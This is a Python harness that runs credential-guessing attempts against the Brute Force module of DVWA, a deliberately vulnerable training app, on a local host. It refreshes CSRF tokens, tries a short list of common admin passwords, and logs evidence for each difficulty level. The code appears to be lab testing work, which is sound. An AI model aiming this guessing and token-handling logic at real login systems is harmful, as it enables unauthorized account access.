#!/usr/bin/env python3
import argparse
import hashlib
import json
import time
from datetime import datetime, timezone, timedelta
from pathlib import Path
from urllib.parse import urljoin

import requests
from bs4 import BeautifulSoup


TZ = timezone(timedelta(hours=8))
DIFFICULTIES = ["low", "medium", "high", "impossible"]
FAIL_MARKER = "Username and/or password incorrect"
SUCCESS_MARKER = "Welcome to the password protected area"
LOCK_MARKER = "Alternative, the account has been locked"


def now_iso():
    return datetime.now(TZ).isoformat(timespec="seconds")


def page_text(html):
    return " ".join(BeautifulSoup(html, "html.parser").get_text(" ").split())


def extract_token(html):
    soup = BeautifulSoup(html, "html.parser")
    field = soup.find("input", {"name": "user_token"})
    return field.get("value") if field else None


def extract_form(html):
    soup = BeautifulSoup(html, "html.parser")
    form = soup.find("form")
    if not form:
        return {"method": None, "action": None, "fields": []}
    fields = []
    for element in form.find_all(["input", "select"]):
        fields.append(
            {
                "tag": element.name,
                "name": element.get("name"),
                "type": element.get("type"),
                "value": element.get("value"),
            }
        )
    return {
        "method": form.get("method", "GET").upper(),
        "action": form.get("action", "#"),
        "fields": fields,
    }


def classify(html):
    text = page_text(html)
    markers = []
    contexts = {}
    if SUCCESS_MARKER in text:
        markers.append("success")
        contexts["success"] = marker_context(text, SUCCESS_MARKER)
    if FAIL_MARKER in text:
        markers.append("failure")
        contexts["failure"] = marker_context(text, FAIL_MARKER)
    if LOCK_MARKER in text:
        markers.append("lockout_message")
        contexts["lockout_message"] = marker_context(text, LOCK_MARKER)
    if "CSRF token" in text or "token" in text.lower():
        markers.append("token_text_seen")
    if not markers:
        markers.append("unknown")
    return markers, contexts, text


def marker_context(text, marker):
    index = text.find(marker)
    if index < 0:
        return ""
    start = max(0, index - 80)
    end = min(len(text), index + len(marker) + 120)
    return text[start:end]


def safe_name(value):
    return "".join(ch if ch.isalnum() or ch in "-_" else "_" for ch in value)


class Harness:
    def __init__(self, base_url, dvwa_user, dvwa_password, source_path, out_dir, proxy=None):
        self.base_url = base_url if base_url.endswith("/") else base_url + "/"
        self.dvwa_user = dvwa_user
        self.dvwa_password = dvwa_password
        self.source_path = Path(source_path)
        self.out_dir = Path(out_dir)
        self.requests_dir = self.out_dir / "requests"
        self.log_path = self.out_dir / "operation-log.jsonl"
        self.json_path = self.out_dir / "report.json"
        self.session = requests.Session()
        self.proxies = {"http": proxy, "https": proxy} if proxy else None
        self.started = time.perf_counter()
        self.entries = []
        self.results = []
        self.total_requests = 0

    def log(self, difficulty, tool, action, input_summary, output_summary, duration_s=None, evidence_path=None):
        entry = {
            "ts": now_iso(),
            "elapsed_s": round(time.perf_counter() - self.started, 3),
            "difficulty": difficulty,
            "tool": tool,
            "action": action,
            "input_summary": input_summary,
            "output_summary": output_summary,
            "duration_s": round(duration_s, 3) if duration_s is not None else None,
            "evidence_path": evidence_path,
        }
        self.entries.append(entry)
        with self.log_path.open("a", encoding="utf-8") as fh:
            fh.write(json.dumps(entry, ensure_ascii=False) + "\n")

    def request(self, method, route, difficulty, label, **kwargs):
        start = time.perf_counter()
        resp = self.session.request(
            method,
            urljoin(self.base_url, route),
            proxies=self.proxies,
            allow_redirects=True,
            timeout=20,
            **kwargs,
        )
        duration = time.perf_counter() - start
        self.total_requests += 1
        markers, marker_contexts, text = classify(resp.text)
        params = kwargs.get("params") or kwargs.get("data") or {}
        evidence = {
            "method": method,
            "url": resp.url,
            "status_code": resp.status_code,
            "elapsed_s": round(duration, 3),
            "request_fields": params,
            "response_len": len(resp.text),
            "markers": markers,
            "marker_contexts": marker_contexts,
            "snippet": text[:420],
        }
        path = self.requests_dir / f"{safe_name(difficulty)}-{safe_name(label)}.json"
        path.write_text(json.dumps(evidence, ensure_ascii=False, indent=2), encoding="utf-8")
        self.log(
            difficulty,
            "python-requests",
            label,
            f"{method} {route} fields={list(params.keys())}",
            f"status={resp.status_code} markers={markers} elapsed={duration:.3f}s",
            duration,
            str(path.relative_to(self.out_dir)),
        )
        return resp, evidence

    def get(self, route, difficulty, label, **kwargs):
        return self.request("GET", route, difficulty, label, **kwargs)

    def post(self, route, difficulty, label, **kwargs):
        return self.request("POST", route, difficulty, label, **kwargs)

    def login(self):
        resp, _ = self.get("login.php", "setup", "fetch-login-form")
        user_token = extract_token(resp.text)
        data = {
            "username": self.dvwa_user,
            "password": self.dvwa_password,
            "Login": "Login",
            "user_token": user_token,
        }
        resp, evidence = self.post("login.php", "setup", "submit-dvwa-login", data=data)
        ok = "Logout" in resp.text or "Damn Vulnerable Web Application" in resp.text
        self.log("setup", "auth", "login-result", "DVWA credentials supplied by user", f"authenticated={ok}")
        if not ok:
            raise RuntimeError("DVWA login did not produce an authenticated page")
        return evidence

    def set_security(self, difficulty):
        resp, _ = self.get("security.php", difficulty, "fetch-security-form")
        user_token = extract_token(resp.text)
        data = {"security": difficulty, "seclev_submit": "Submit", "user_token": user_token}
        resp, evidence = self.post("security.php", difficulty, "set-security", data=data)
        cookie_level = self.session.cookies.get("security")
        self.log(difficulty, "dvwa", "security-cookie", f"requested={difficulty}", f"cookie={cookie_level}")
        return evidence

    def inspect_module(self, difficulty):
        resp, evidence = self.get("vulnerabilities/brute/", difficulty, "inspect-module-form")
        form = extract_form(resp.text)
        evidence["form"] = form
        evidence["security_cookie"] = self.session.cookies.get("security")
        path = self.requests_dir / f"{difficulty}-inspect-module-form.json"
        path.write_text(json.dumps(evidence, ensure_ascii=False, indent=2), encoding="utf-8")
        self.log(difficulty, "html-parser", "form-model", "first form", json.dumps(form, ensure_ascii=False))
        return form, resp.text

    def source_metadata(self, difficulty):
        source_file = self.source_path / "vulnerabilities" / "brute" / "source" / f"{difficulty}.php"
        data = source_file.read_bytes()
        meta = {
            "path": str(source_file),
            "size_bytes": source_file.stat().st_size,
            "sha256": hashlib.sha256(data).hexdigest(),
            "mtime": datetime.fromtimestamp(source_file.stat().st_mtime, TZ).isoformat(timespec="seconds"),
        }
        self.log(difficulty, "source-review", f"read {difficulty}.php", str(source_file), f"sha256={meta['sha256'][:16]}")
        return meta

    def attempt_login(self, difficulty, username, password, label, method, token_required):
        params = {"username": username, "password": password, "Login": "Login"}
        if token_required:
            form_resp, _ = self.get("vulnerabilities/brute/", difficulty, f"{label}-fetch-fresh-token")
            params["user_token"] = extract_token(form_resp.text)
        if method == "POST":
            resp, evidence = self.post("vulnerabilities/brute/", difficulty, label, data=params)
        else:
            resp, evidence = self.get("vulnerabilities/brute/", difficulty, label, params=params)
        evidence["username"] = username
        evidence["password"] = password
        evidence["token_required"] = token_required
        return evidence

    def run_level(self, difficulty):
        level_start = time.perf_counter()
        requests_before = self.total_requests
        self.set_security(difficulty)
        form, module_html = self.inspect_module(difficulty)
        source_meta = self.source_metadata(difficulty)
        method = form["method"] or ("POST" if difficulty == "impossible" else "GET")
        token_required = difficulty in ("high", "impossible")

        baseline = self.attempt_login(
            difficulty,
            "codex_probe_user",
            "definitely_wrong_20260602",
            "baseline-invalid-credential",
            method,
            token_required,
        )

        attempts = []
        status = "not_run"
        credential = None
        stop_reason = ""

        if difficulty in ("low", "medium", "high"):
            plan = [
                ("admin", "dvwa2026!"),
                ("admin", "letmein"),
                ("admin", "123456"),
                ("admin", "password"),
            ]
            self.log(
                difficulty,
                "test-plan",
                "generated-small-credential-sequence",
                "admin with three wrong candidates, then supplied lab credential late",
                json.dumps(plan, ensure_ascii=False),
            )
            for idx, (username, password) in enumerate(plan, 1):
                evidence = self.attempt_login(
                    difficulty,
                    username,
                    password,
                    f"attempt-{idx}-{safe_name(username)}-{safe_name(password)}",
                    method,
                    token_required,
                )
                attempts.append(evidence)
                if "success" in evidence["markers"]:
                    status = "solved_vulnerable"
                    credential = {"username": username, "password": password}
                    stop_reason = "response contained success marker after repeated attempts"
                    break
            if status == "not_run":
                status = "inconclusive"
                stop_reason = "small generated sequence did not find a credential"
        else:
            self.log(
                difficulty,
                "test-plan",
                "defense-validation-plan",
                "avoid large brute force; verify tokenized POST and one known valid credential separately",
                "source shows prepared statements, failed_login counter, and 15 minute lockout",
            )
            valid = self.attempt_login(
                difficulty,
                "admin",
                "password",
                "credential-validation-admin-password",
                method,
                token_required,
            )
            attempts.append(valid)
            status = "defended_not_vulnerable"
            credential = {"username": "admin", "password": "password"} if "success" in valid["markers"] else None
            stop_reason = "impossible uses tokenized POST, prepared statements, failed-login counter, and lockout; valid credential is not brute-force proof"

        elapsed = time.perf_counter() - level_start
        result = {
            "difficulty": difficulty,
            "status": status,
            "credential": credential,
            "stop_reason": stop_reason,
            "method": method,
            "token_required": token_required,
            "form": form,
            "source": source_meta,
            "baseline": baseline,
            "attempts": attempts,
            "request_count": self.total_requests - requests_before,
            "level_elapsed_s": round(elapsed, 3),
        }
        self.results.append(result)
        self.log(difficulty, "harness", "level-conclusion", difficulty, f"{status}; {stop_reason}", elapsed)
        return result

    def run(self):
        self.out_dir.mkdir(parents=True, exist_ok=True)
        self.requests_dir.mkdir(parents=True, exist_ok=True)
        if self.log_path.exists():
            self.log_path.unlink()
        run_started = now_iso()
        self.login()
        stop_after = None
        for difficulty in DIFFICULTIES:
            result = self.run_level(difficulty)
            if result["status"] in ("defended_not_vulnerable", "blocked", "inconclusive"):
                stop_after = difficulty
                break
        run_finished = now_iso()
        payload = {
            "target": self.base_url,
            "module": "Brute Force",
            "run_started": run_started,
            "run_finished": run_finished,
            "elapsed_s": round(time.perf_counter() - self.started, 3),
            "stop_after": stop_after,
            "total_requests": self.total_requests,
            "results": self.results,
            "operation_log": str(self.log_path),
        }
        self.json_path.write_text(json.dumps(payload, ensure_ascii=False, indent=2), encoding="utf-8")
        print(json.dumps(payload, ensure_ascii=False, indent=2))


def main():
    parser = argparse.ArgumentParser(description="DVWA Brute Force progression harness generated from live page/source inspection.")
    parser.add_argument("--base-url", default="http://127.0.0.1/dvwa/")
    parser.add_argument("--dvwa-user", default="admin")
    parser.add_argument("--dvwa-password", default="password")
    parser.add_argument("--source-path", default=r"D:\phpStudy\PHPTutorial\WWW\DVWA")
    parser.add_argument("--out-dir", required=True)
    parser.add_argument("--proxy", default=None)
    args = parser.parse_args()
    Harness(args.base_url, args.dvwa_user, args.dvwa_password, args.source_path, args.out_dir, args.proxy).run()


if __name__ == "__main__":
    main()
